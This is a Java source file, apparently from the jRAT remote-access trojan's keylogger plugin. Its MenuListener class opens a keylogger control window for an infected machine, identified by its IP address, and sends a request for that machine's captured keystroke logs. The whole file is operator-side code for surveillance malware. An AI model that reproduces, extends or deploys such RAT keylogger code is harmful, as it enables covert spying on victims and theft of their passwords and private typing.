package pro.jrat.plugin.client;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.List;

import javax.swing.ImageIcon;
import javax.swing.JFrame;

import pro.jrat.api.BaseControlPanel;
import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATMenuItemActionListener;
import pro.jrat.api.RATObject;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<RATObject> servers) {
		try {
			if (servers.size() > 0) {
				final RATObject server = servers.get(0);
				BaseControlPanel panel = null;

				if (KeyloggerPlugin.entry.instances.containsKey(server.getIP())) {
					panel = KeyloggerPlugin.entry.instances.get(server.getIP());
				} else {
					panel = KeyloggerPlugin.entry.newPanelInstance(server);
					KeyloggerPlugin.entry.instances.put(server.getIP(), panel);
				}
				
				final BaseControlPanel finalPanel = panel;

				JFrame frame = new JFrame();
				frame.addWindowListener(new WindowAdapter() {
					@Override
					public void windowClosing(WindowEvent arg0) {
						finalPanel.onClose();
						KeyloggerPlugin.entry.instances.remove(server.getIP());
					}
				});
				frame.setTitle("Keylogger - " + server.getIP());
				frame.setSize(500, 350);
				frame.setLocationRelativeTo(null);
				frame.setIconImage(new ImageIcon(KeyloggerPlugin.ICON_LOCATION).getImage());
				frame.setLocationRelativeTo(null);
				frame.add(panel);
				frame.setVisible(true);
				
				try {
					server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, server) {
						@Override
						public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
							
						}
					});
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
